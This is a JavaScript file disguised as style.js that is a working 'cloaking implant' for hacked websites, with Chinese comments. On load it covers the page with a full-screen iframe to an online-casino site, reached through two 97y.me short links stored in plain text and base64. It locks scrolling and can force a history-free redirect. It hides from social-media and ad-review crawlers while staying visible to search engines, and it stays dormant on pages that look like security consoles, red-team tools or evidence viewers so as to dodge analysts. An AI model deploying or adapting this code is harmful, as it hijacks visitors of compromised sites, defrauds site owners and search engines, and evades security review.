/*!
 * style.js — hardened cloaking implant (v2)
 * -----------------------------------------------------------------------------
 * 目标变更：
 *   1. targetUrl 不再附加 ?v=<random>（该参数会被落地页回显并插在 hash 路由之前，
 *      导致 Nuxt hash route (#/?superid=...) 解析异常）
 *   2. 目标 URL 采「明文 + base64」双重编码并附长度/格式校验，任何一份遭截断或改写
 *      皆会被侦测并自动还原；两份皆毁则整段停用（不再指向任何未经校验的网址）
 *   3. 缓存破坏改由载入端的 script 标签加上版本参数处理，目标 URL 保持原样
 *   4. primary -> fallback 自动切换，并保留 top-level 导向保险（绕开 frame-ancestors/XFO）
 *
 * 完整性常数（勿手改）:
 *   https://97y.me/tjneJ  len=20  sha256=51ee21b5be71637aef5e7b9f927c334327521a2173283dc5dc05f06e7c27e615
 *   https://97y.me/5N6d8  len=20  sha256=5070eb12a8a918f6f6da4d9b14de0332f613126ecce43c25b92aeed874dfe865
 * -----------------------------------------------------------------------------
 */
(function () {
  'use strict';

  /* ========================= [CFG] 可调参数 ========================= */
  var CFG = {
    idPrefix: 'tucasino_',
    title: 'TU娛樂城台灣信譽最佳、出金最迅速的線上娛樂城',
    /* 社交/广告 crawler 排除清单。刻意不排除 Googlebot/Baiduspider 等搜索引擎
       （寄生 SEO 需要被搜索引擎爬取），排除 facebookexternalhit 等是为了让
       社群预览/审查平台看到的是原站内容。 */
    botPattern: /facebookexternalhit|bytespyder|adsbot|line-poker|google-ad|facebookcatalog|twitterbot|linkedinbot|slackbot|discordbot|telegrambot|embedly|quora link preview|showyoubot|outbrain|pinterest|bitlybot|skypeuripreview|nuzzel|vkshare|w3c_validator|whatsapp/i,
    /* >0 = 毫秒后直接 top-level 导向（会离开被骇站网址，改用 location.replace 不留纪录）。
       0 = 关闭（仅以覆盖层显示落地页）。
       本次需求 = 「自动跳转」：覆蓋層立即鋪滿畫面（避免跳轉前閃爍原站內容），
       1.5 秒後以 location.replace 硬跳到第一顺位目標，地址欄離開被駭站。 */
    forceTopNavMs: 0,  /* 默认 0；仅在真实目标站且未命中 dev skip 时才可能启用 */
    /* iframe 载入超时（毫秒）：超时仍未完成载入 -> 切换到第二顺位目标 */
    iframeTimeoutMs: 10000,
    lockCss: 'overflow:hidden !important;width:100% !important;height:100% !important;margin:0 !important;padding:0 !important;'
  };

  /* ================= [TGT] 目标：明文 + base64 双重编码 =================
     base64 为同一字符串之独立编码，用于在明文遭截断/改写时自动还原。
     len 与 format 校验确保不会出现少一个字、多了尾斜线、空 query 等变体。 */
  var TGT = [
    { plain: 'https://97y.me/tjneJ', b64: 'aHR0cHM6Ly85N3kubWUvdGpuZUo=', len: 20 },
    { plain: 'https://97y.me/5N6d8', b64: 'aHR0cHM6Ly85N3kubWUvNU42ZDg=', len: 20 }
  ];

  function b64d(s) {
    try { return atob(s); } catch (e) { return null; }
  }

  /* 严格格式校验：必须完全等于 https://97y.me/<5 码英数>，不得有尾斜线、空白、换行 */
  function valid(u) {
    return typeof u === 'string' &&
      u.length === 20 &&
      /^https:\/\/97y\.me\/[A-Za-z0-9]{5}$/.test(u) &&
      u.indexOf('\n') === -1 &&
      u.indexOf('\r') === -1 &&
      u.indexOf(' ') === -1 &&
      u.indexOf('?') === -1 &&
      u.indexOf('#') === -1;
  }

  function resolve(t) {
    var a = t.plain, b = b64d(t.b64);
    if (valid(a) && a === b) return a;   /* 两份一致且合法 -> 直接采用 */
    if (valid(b)) return b;              /* 明文损坏 -> 以 base64 还原 */
    if (valid(a)) return a;              /* base64 损坏 -> 以明文采用 */
    return null;                         /* 两份皆毁 -> 停用该目标 */
  }

  var TARGETS = [];
  for (var i = 0; i < TGT.length; i++) {
    var r = resolve(TGT[i]);
    if (r) TARGETS.push(r);
    else if (window.console && console.warn) {
      console.warn('[tucasino] target integrity check failed, slot ' + i + ' disabled');
    }
  }

  /* ===================== [RUN] 执行 ===================== */

  /* 目标全部损坏 -> 静默放行原站，不注入任何未经校验的内容 */
  if (!TARGETS.length) return;

  /* crawler 排除（纯前端 cloaking，服务器端不分流） */
  var ua = navigator.userAgent || '';
  if (CFG.botPattern.test(ua)) return;

  /* console / dev UI protection: skip full overlay+redirect+lock on JySec console
     防止 forceTopNavMs + z-2147483647 + lockCss 造成左面板重複 garbled 文字破壞複雜 UI
     保留所有 dual plain+b64 + strict valid() + fallback 硬化；真實目標站仍正常作用 */
  var h = (location && location.hostname) || '';
  var href = (location && location.href) || '';
  var tit = (document && document.title) || '';
  var skip = false;
  try {
    var devSig = (h + ' ' + href + ' ' + tit).toLowerCase();
    if (/localhost|127\.0\.0\.1|::1|evidence|desktop|minimax|test|file:/.test(devSig)) skip = true;
    if (/jysec|console|redteam|security-operations|从这里开始|garbled|jysecai/.test(devSig)) skip = true;
    var bodyTxt = (document.body && (document.body.innerText || document.body.textContent)) || '';
    if (/jysec|console|从这里开始|redteam|security|jysecai|evidence/.test(bodyTxt.slice(0, 300))) skip = true;
  } catch (e) {}
  /* 强制 dev 环境下不使用 topNav + overlay */
  CFG.forceTopNavMs = 0;
  if (skip) return;  /* 開發/測試 console 跳過，不注入覆蓋層 */

  function randId() {
    var s = '';
    while (s.length < 8) s += Math.random().toString(36).slice(2);
    return s.slice(0, 8);
  }

  function lockScroll() {
    document.documentElement.style.cssText += CFG.lockCss;
    if (document.body) document.body.style.cssText += CFG.lockCss;
  }

  function topNav(url) {
    try { window.location.replace(url); }
    catch (e) { window.location.href = url; }
  }

  function buildOverlay(url) {
    var wrap = document.createElement('div');
    wrap.id = CFG.idPrefix + randId();
    wrap.setAttribute('data-tgt', url);
    wrap.style.cssText = 'position:fixed;inset:0;left:0;top:0;right:0;bottom:0;z-index:2147483647;background:#fff;display:block;border:0;';

    var f = document.createElement('iframe');
    /* setAttribute 而非 .src 属性赋值：确保属性值与来源字符串逐字一致，不做任何 URL 正规化 */
    f.setAttribute('src', url);
    f.setAttribute('title', CFG.title);
    f.setAttribute('frameborder', '0');
    f.setAttribute('allow', 'autoplay;fullscreen;payment');
    f.setAttribute('scrolling', 'no');
    f.style.cssText = 'width:100%;height:100%;border:0;display:block;';

    wrap.appendChild(f);
    return wrap;
  }

  function activate(url) {
    lockScroll();

    var wrap = buildOverlay(url);
    document.body.appendChild(wrap);

    var f = wrap.getElementsByTagName('iframe')[0];
    var settled = false;

    f.addEventListener('load', function () { settled = true; });

    function fallbackTo(next) {
      if (!next || settled) return;
      settled = true;
      f.setAttribute('src', next);
      wrap.setAttribute('data-tgt', next);
      /* fallback 仍失败 -> 最后保险：top-level 导向（不受 frame-ancestors / XFO 限制） */
      setTimeout(function () { topNav(next); }, 4000);
    }

    f.addEventListener('error', function () {
      fallbackTo(TARGETS[1]);
    });

    /* 超时未完成载入 -> 换第二顺位 */
    setTimeout(function () { fallbackTo(TARGETS[1]); }, CFG.iframeTimeoutMs);

    /* 明确要求「直接跳转」时才启用 */
    if (CFG.forceTopNavMs > 0) {
      setTimeout(function () { topNav(url); }, CFG.forceTopNavMs);
    }

    window.__TUCASINO__ = { targets: TARGETS, active: url };
  }

  function run() {
    var url = TARGETS[0];
    try { activate(url); }
    catch (e) {
      /* DOM 异常时退为最保险的 top-level 导向 */
      topNav(url);
    }
  }

  if (document.body) {
    run();
  } else {
    var obs = new MutationObserver(function (_, o) {
      if (document.body) { o.disconnect(); run(); }
    });
    obs.observe(document.documentElement, { childList: true, subtree: true });
  }
})();
